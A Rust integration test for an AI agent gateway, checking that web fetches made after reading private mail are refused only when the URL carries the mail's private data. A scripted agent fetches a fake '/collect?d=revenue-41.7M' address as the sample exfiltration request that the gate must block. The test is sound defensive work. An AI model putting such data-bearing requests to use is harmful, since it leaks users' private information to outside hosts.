//! Web reads after private mail and an untrusted page
//! (decisions/2026-11-22-requests-checked-for-private-data.md), through the
//! real gate. A link the page gave opens, and so does an address the model
//! made up, with no card. Only an address carrying the mail's private data
//! is refused, and the agent is told to leave the data out.

use magnus_invariants::{mcp, *};
use magnus_scratch::start_checked;
use serde_json::json;

#[tokio::test(flavor = "multi_thread")]
async fn any_address_opens_unless_it_carries_private_data() {
    let other = FakeWeb::start(&[("/story", "the story"), ("/collect", "thanks")]).await;
    let story = other.url("/story");
    let news_page = format!("Today's news. Read more: {story}");
    let news = FakeWeb::start(&[("/news", news_page.as_str())]).await;
    let news_url = news.url("/news");
    let (leak, again) = (other.url("/collect?d=revenue-41.7M"), other.url("/collect?d=more"));
    let mail = mcp::mail().start().await;
    let m = start_checked(script(move |c| {
        let (news_url, story, leak, again) = (news_url.clone(), story.clone(), leak.clone(), again.clone());
        async move {
            match c.turn() {
                0 => plan("read my inbox and the news"),
                1 => tool("mail__list_inbox", json!({})),
                2 => tool("web_fetch", json!({ "url": news_url })),
                3 => tool("web_fetch", json!({ "url": story })),
                4 => tool("web_fetch", json!({ "url": leak })),
                5 => tool("web_fetch", json!({ "url": again })),
                _ => complete("read"),
            }
        }
    }))
    .await;
    let spec = Spec::default().app("mail", &mail, "public", "private", &[("list_inbox", "read")]);
    let app = Appliance::start(spec, &m).await;
    let alice = app.api("alice");
    let t = alice.submit("Read my inbox and the news page.").await;

    alice.wait_settled(&t).await;
    assert!(other.hits().iter().any(|h| h == "/story"), "a link the page gave was held: {:?}", other.hits());
    assert!(other.hits().iter().all(|h| !h.contains("41.7")), "the mail's private data went out: {:?}", other.hits());
    assert!(other.hits().iter().any(|h| h.contains("d=more")), "a made-up address carrying nothing private was held: {:?}", other.hits());
    let (_, inbox) = alice.get("/v1/inbox").await;
    let asks = inbox["items"].as_array().into_iter().flatten().filter(|i| i["kind"] == "approval").count();
    assert_eq!(asks, 0, "a web read put a card in front of the person: {inbox}");
    let told: Vec<String> = m.requests().iter().flat_map(|r| r.last_results()).map(|r| r.text).collect();
    assert!(told.iter().any(|t| t.contains("contains private data")), "the agent was not told why: {told:?}");
}
